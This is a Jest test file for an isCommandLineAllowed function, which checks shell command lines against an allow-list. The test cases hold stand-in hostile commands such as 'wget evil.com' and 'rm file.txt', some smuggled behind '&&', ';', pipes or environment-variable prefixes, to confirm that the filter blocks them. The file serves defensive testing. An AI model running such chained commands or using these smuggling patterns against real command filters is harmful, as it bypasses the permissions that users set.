import { isCommandLineAllowed } from '../isCommandLineAllowed.js';

describe('isCommandLineAllowed', () => {
  describe('simple commands', () => {
    it.each([
      { commandLine: 'echo hello world', allowList: ['echo'], expected: true },
      { commandLine: "echo 'hello world", allowList: ['echo'], expected: true },
      { commandLine: 'wget evil.com', allowList: ['echo'], expected: false },
      { commandLine: 'git status', allowList: ['echo', 'git'], expected: true },
      {
        commandLine: 'rm file.txt',
        allowList: ['echo', 'git'],
        expected: false,
      },
      { commandLine: 'echo grep', allowList: ['grep'], expected: false },

      // Compound commands
      {
        commandLine: 'echo hello && wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'echo hello; wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'echo hello && echo world',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'echo hello | wget evil.com',
        allowList: ['echo'],
        expected: false,
      },

      // Commands with environment variables
      {
        commandLine: 'FOO=bar echo hello',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'FOO=bar BAR=baz echo hello',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'foo=bar echo hello',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'FOO=bar wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'FOO=bar echo hello && wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'echo hello && FOO=bar wget evil.com',
        allowList: ['echo'],
        expected: false,
      },
      {
        commandLine: 'FOO=bar echo hello && BAR=baz echo world',
        allowList: ['echo'],
        expected: true,
      },
      {
        commandLine: 'FOO=bar wget evil.com && BAR=baz rm file.txt',
        allowList: ['echo'],
        expected: false,
      },
    ])(
      '$commandLine with $allowList',
      ({ commandLine, allowList, expected }) => {
        const actual = isCommandLineAllowed(commandLine, allowList);
        expect(actual).toBe(expected);
      },
    );
  });
});
